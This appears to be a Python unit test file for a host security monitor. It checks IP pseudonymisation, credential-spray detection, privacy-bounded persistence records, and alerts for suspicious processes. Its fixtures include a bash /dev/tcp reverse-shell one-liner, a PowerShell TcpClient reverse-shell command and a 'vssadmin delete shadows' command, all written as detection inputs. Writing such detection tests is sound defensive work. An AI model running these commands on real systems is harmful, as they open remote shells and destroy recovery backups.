from __future__ import annotations

import json
import tempfile
import unittest
from datetime import datetime, timezone
from pathlib import Path

from quietward.collectors.parsers import (
    parse_auth_journal,
    parse_connections_output,
    parse_ps_output,
)
from quietward.collectors.windows_parsers import (
    parse_windows_auth_events,
    parse_windows_connections,
    parse_windows_persistence,
    parse_windows_processes,
)
from quietward.config import StorageSettings
from quietward.contracts import EventKind, SecurityEvent, Severity
from quietward.privacy_identity import PrivacyIdentity
from quietward.product_store import ProductSentinelStore
from quietward.scoring import DeterministicRiskScorer


RAW_IP = "203.0.113.42"
NOW = datetime(2026, 8, 24, 20, 0, tzinfo=timezone.utc)


class V05ReleaseMergeTests(unittest.TestCase):
    def test_linux_address_pseudonyms_are_installation_keyed(self) -> None:
        first = PrivacyIdentity(b"a" * 32)
        second = PrivacyIdentity(b"b" * 32)
        connection_text = (
            f'tcp ESTAB 0 0 192.168.1.10:5000 {RAW_IP}:443 '
            'users:(("app",pid=2,fd=3))'
        )
        one = parse_connections_output(connection_text, first)[0]
        two = parse_connections_output(connection_text, second)[0]
        self.assertNotEqual(one.remote_address_hash, two.remote_address_hash)
        self.assertNotIn(RAW_IP, json.dumps(one.to_dict()))

        auth_text = json.dumps(
            {
                "MESSAGE": f"Failed password for invalid user admin from {RAW_IP}",
                "__REALTIME_TIMESTAMP": "1785430800000000",
            }
        )
        auth_one = parse_auth_journal(auth_text, privacy_identity=first)[0]
        auth_two = parse_auth_journal(auth_text, privacy_identity=second)[0]
        self.assertNotEqual(
            auth_one["source_address_hash"], auth_two["source_address_hash"]
        )
        self.assertNotIn(RAW_IP, json.dumps(auth_one, default=str))

    def test_windows_address_pseudonyms_are_installation_keyed(self) -> None:
        first = PrivacyIdentity(b"a" * 32)
        second = PrivacyIdentity(b"b" * 32)
        connections = json.dumps(
            [{
                "Protocol": "tcp",
                "RemoteAddress": RAW_IP,
                "RemotePort": 443,
                "ProcessName": "browser",
            }]
        )
        first_connection = parse_windows_connections(connections, first)[0]
        second_connection = parse_windows_connections(connections, second)[0]
        self.assertNotEqual(
            first_connection.remote_address_hash,
            second_connection.remote_address_hash,
        )

        auth = json.dumps(
            [{
                "TimeCreated": "2026-08-24T20:00:00Z",
                "User": "Administrator",
                "SourceAddress": RAW_IP,
            }]
        )
        first_event = parse_windows_auth_events(
            auth,
            host_id="host-a",
            privacy_identity=first,
            fallback_time=NOW,
        )[0]
        second_event = parse_windows_auth_events(
            auth,
            host_id="host-a",
            privacy_identity=second,
            fallback_time=NOW,
        )[0]
        self.assertNotEqual(
            first_event.attributes["source_address_hash"],
            second_event.attributes["source_address_hash"],
        )
        self.assertNotIn(RAW_IP, json.dumps(first_event.to_dict()))

    def test_windows_high_signal_process_markers(self) -> None:
        identity = PrivacyIdentity(b"a" * 32)
        process_rows = [
            {
                "ProcessId": 10,
                "ParentProcessId": 1,
                "Name": "WINWORD.EXE",
                "ExecutablePath": r"C:\\Program Files\\Microsoft Office\\WINWORD.EXE",
                "CommandLine": "WINWORD.EXE document.docx",
                "UserName": r"DOMAIN\\user",
            },
            {
                "ProcessId": 11,
                "ParentProcessId": 10,
                "Name": "powershell.exe",
                "ExecutablePath": r"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "CommandLine": (
                    "powershell.exe -NoProfile "
                    "New-Object Net.Sockets.TcpClient('127.0.0.1',4444)"
                ),
                "UserName": r"DOMAIN\\user",
            },
            {
                "ProcessId": 12,
                "ParentProcessId": 1,
                "Name": "vssadmin.exe",
                "ExecutablePath": r"C:\\Windows\\System32\\vssadmin.exe",
                "CommandLine": "vssadmin.exe delete shadows /all /quiet",
                "UserName": r"NT AUTHORITY\\SYSTEM",
            },
        ]
        records = parse_windows_processes(json.dumps(process_rows), identity)
        by_pid = {item.pid: item for item in records}
        self.assertIn("reverse_shell", by_pid[11].suspicious_markers)
        self.assertIn("document_spawned_interpreter", by_pid[11].suspicious_markers)
        self.assertIn("ransomware_recovery_inhibition", by_pid[12].suspicious_markers)

    def test_windows_credential_spray_context(self) -> None:
        identity = PrivacyIdentity(b"a" * 32)
        rows = []
        for index in range(10):
            rows.append(
                {
                    "TimeCreated": f"2026-08-24T20:00:{index:02d}Z",
                    "User": f"user{index % 5}",
                    "SourceAddress": RAW_IP,
                }
            )
        events = parse_windows_auth_events(
            json.dumps(rows),
            host_id="host-a",
            privacy_identity=identity,
            fallback_time=NOW,
        )
        self.assertTrue(events)
        self.assertTrue(all(event.attributes["credential_spray_candidate"] for event in events))
        self.assertTrue(all("credential_spray" in event.attributes["suspicious_markers"] for event in events))

    def test_windows_persistence_contract_is_privacy_bounded(self) -> None:
        identity = PrivacyIdentity(b"a" * 32)
        rows = [{
            "Category": "service_auto",
            "Name": "ExampleService",
            "Command": r"C:\\Users\\user\\AppData\\Local\\example.exe",
            "State": "enabled",
            "Account": "LocalSystem",
        }]
        records = parse_windows_persistence(json.dumps(rows), identity)
        self.assertEqual(len(records), 1)
        value = records[0].to_dict()
        serialized = json.dumps(value)
        self.assertNotIn("ExampleService", serialized)
        self.assertNotIn("LocalSystem", serialized)
        self.assertNotIn("AppData\\\\Local\\\\example.exe", serialized)
        self.assertIn("privileged_service", records[0].risk_markers)
        self.assertIn("user_writable_target", records[0].risk_markers)

    def test_linux_web_parent_only_strengthens_already_suspicious_shell(self) -> None:
        text = "\n".join(
            [
                "100 1 www-data nginx nginx: master process",
                "101 100 www-data bash bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'",
            ]
        )
        records = parse_ps_output(text)
        child = next(item for item in records if item.pid == 101)
        self.assertIn("reverse_shell", child.suspicious_markers)
        self.assertIn("web_server_spawned_suspicious_shell", child.suspicious_markers)

    def test_high_signal_scoring_reaches_high_priority(self) -> None:
        event = SecurityEvent(
            "high-signal",
            NOW,
            "host-a",
            "windows_process_snapshot",
            EventKind.PROCESS_START,
            "process:powershell",
            {"suspicious_markers": ["reverse_shell"]},
            0.95,
        )
        assessment = DeterministicRiskScorer().score(event)
        self.assertIn(assessment.severity, {Severity.HIGH, Severity.CRITICAL})

    def test_high_signal_event_bypasses_existing_suppression_rule(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            settings = StorageSettings(
                database_path=root / "sentinel.sqlite3",
                alert_log_path=root / "alerts.jsonl",
            )
            event = SecurityEvent(
                "reverse-shell",
                NOW,
                "host-a",
                "windows_process_snapshot",
                EventKind.PROCESS_START,
                "shared-subject",
                {"suspicious_markers": ["reverse_shell"]},
                0.95,
            )
            with ProductSentinelStore(settings) as store:
                with store.connection:
                    store.connection.execute(
                        """
                        INSERT INTO suppression_rules(
                            rule_id,source_finding_id,subject,kinds_json,
                            expires_at,reason,enabled,created_at
                        ) VALUES(?,?,?,?,?,?,1,?)
                        """,
                        (
                            "rule-1",
                            None,
                            "shared-subject",
                            json.dumps([EventKind.PROCESS_START.value]),
                            None,
                            "test",
                            NOW.isoformat().replace("+00:00", "Z"),
                        ),
                    )
                kept, suppressed = store.filter_suppressed_events([event], now=NOW)
                self.assertEqual([item.event_id for item in kept], ["reverse-shell"])
                self.assertEqual(suppressed, [])


if __name__ == "__main__":
    unittest.main()
